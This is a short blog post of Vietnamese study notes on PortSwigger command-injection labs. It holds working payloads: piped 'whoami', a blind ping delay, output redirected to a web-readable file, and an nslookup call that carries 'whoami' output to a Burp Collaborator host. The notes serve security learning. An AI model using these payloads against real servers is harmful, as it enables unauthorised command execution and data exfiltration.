---
layout: post
title: "Command injection"
render_with_liquid: false
categories:
  - PortSwigger
tags:
  - portswigger
  - command-injection
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Server-side

Sửa tham số `storeID` thành

```jsx
1|whoami
```

Thanh đổi tham số `email`

```jsx
email=x||ping+-c+10+127.0.0.1||
```

```jsx
╔═══════════════════════════════════════════════════════════════════════╗
║                        FEEDBACK FORM REQUEST                          ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  POST /feedback HTTP/2                                                ║
║  Host: vulnerable-website.com                                         ║
║  Content-Type: application/x-www-form-urlencoded                      ║
║                                                                       ║
║  csrf=xxx&name=test&email=test@test.com&subject=test&message=test     ║
║                     ▲                                                 ║
║                     │                                                 ║
║                     └── Injection point                               ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝

┌──────────┐                                           ┌─────────┐
│ Attacker │                                           │ Server  │
└────┬─────┘                                           └────┬────┘
     │                                                      │
     │  POST /feedback                                      │
     │  email=x||whoami>/var/www/images/out.txt||          │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │                              ┌───────────────────────┴──────┐
     │                              │ Shell executes:              │
     │                              │                              │
     │                              │ mail -s "Subject" x||whoami  │
     │                              │ >/var/www/images/out.txt||   │
     │                              │                              │
     │                              │ Command breakdown:           │
     │                              │ 1. mail -s "Subject" x → FAIL│
     │                              │ 2. || → run next if failed   │
     │                              │ 3. whoami > /var/.../out.txt │
     │                              │    → Writes "peter-xyz" to   │
     │                              │       out.txt                │
     │                              │                              │
     │                              │ Response: "Thank you"        │
     │                              │ (No output visible)          │
     │                              └───────────────────────┬──────┘
     │                                                      │
     │   200 OK "Thank you for feedback"                    │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │   (Output không hiển thị - BLIND!)                   │
     │                                                      │
     │  GET /image?filename=out.txt                         │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │                              ┌───────────────────────┴──────┐
     │                              │ Read: /var/www/images/out.txt│
     │                              │ Content: "peter-xyz"         │
     │                              └───────────────────────┬──────┘
     │                                                      │
     │   200 OK                                             │
     │   peter-xyz                                          │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │   ✓ Command output retrieved!                        │
     ▼                                                      ▼
```

```jsx
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

```jsx
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
